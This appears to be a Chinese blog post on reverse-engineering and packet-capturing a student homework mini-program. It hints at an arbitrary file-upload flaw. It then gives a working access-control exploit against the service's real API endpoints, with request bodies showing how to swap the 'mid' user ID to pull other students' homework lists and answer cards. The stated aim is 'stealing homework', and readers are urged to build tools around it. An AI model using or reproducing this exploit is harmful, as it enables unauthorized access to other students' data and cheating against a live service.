# 凡高的抓包及逆向分析
### 我们通过逆向可以知道啥
我们不妨可以通过逆向可以看看凡高这个 *** 写了什么屌代码
##### 因为这里存在高危漏洞，不方便放出来，有技术的哥们自己悟吧！（你们的渗透与我无关，我并未提供任何技术细节及暗示）

 我们通过逆向项目小程序代码发现其中作业提交有巨大的安全隐患，对于图片的格式认证只做了前端认证，理论是只要绕过前端就可以实现任意文件上传，恰恰这个 *** 做了前后端分离，这就直接导致我们可以通过调取api的方式获取到上传权限。。。
（这个东西涉及渗透，所以我教不了，大家自己研究研究吧）

### 我们通过抓包可以知道啥
我们都知道，其中有一个功能很神奇叫做==互相判作业==,这个玩意就是我们突破的关键，why？因为这个东西很神奇，因为我根本不知道我会批改谁的作业，所以这里的权限管理十分混乱，所以就导致我登录凭证是A，但我可以访问B的作业。这便是我们偷作业的基本实现逻辑。

因为主播也怕给自己找麻烦，所以只提供部分的指导，我相信有志之士将会根据我的部分代码及逻辑开发出相应的应用程序的。

好了废话不多说直接开始

#### api库
##### 1.用户信息

| 请求方式 | 请求url                                                 |
| ---- | ----------------------------------------------------- |
| post | https://api.fangao.100eks.com/member.miniprogram.auth |

这个需要wxcode的唯一认证，所以我们获取token的方式只有抓包。（不会抓包的放弃吧）

##### 2.作业列表

| 请求方式 | 请求url                                                |
| ---- | ---------------------------------------------------- |
| post | https://api.homework.100eks.com/member.homework.list |

这个就需要我们手动改包和发包了
不妨给您看看包的结构

```json
{
"request" : {
	"mid":88888888,
	"subject_id":1,
	"page":1,
	"pageSize":10}
}
```
很好，这就是发包的内容，我们需要做什么？
只需要把你想偷人的 ```mid``` 换上去即可，这时候有聪明的小伙伴问了：主播主播，你的技术确实很强，但我怎么知道别人的的mid呢？（其实在你mid的基础上改个十位的数字就好了）。
> 还有重要的不要忘记请求头加上你的token

好了，这样我们就可以收到想下面这样的data

```json
{ 
	"code": 0, 
	"msg": "请求成功", 
	"time": 88888888, 
	"data": [ { 
		"chid": 88888888, 
		"hid": 88888888, 
		"subject_name": "语文", 
		"subject_id": 1, 
		"username": "name", 
		"mid": 88888888, 
		"homework_title": "语文寒假作业", 
		"start_date": "2025-00-00 00:00:00", 
		"end_date": "2025-00-00 00:00:00", 
		"status": 0, 
		"type": "homework", 
		"homework_type": 1 },  
	] }
```
大家可以通过识别上面的username，来检查是否成功。
我们需要上面的一些信息让我们完成后面的部分

#### 3.作业页

| 请求方式 | 请求url                                                        |
| ---- | ------------------------------------------------------------ |
| post | https://api.homework.100eks.com/member.homework.success.card |

发包内容

```json
{
"request" : {
	"mid":88888888,
	"hid":"0000"
	}
}
```
修改方式同上
这样简单的偷作业就完成了。
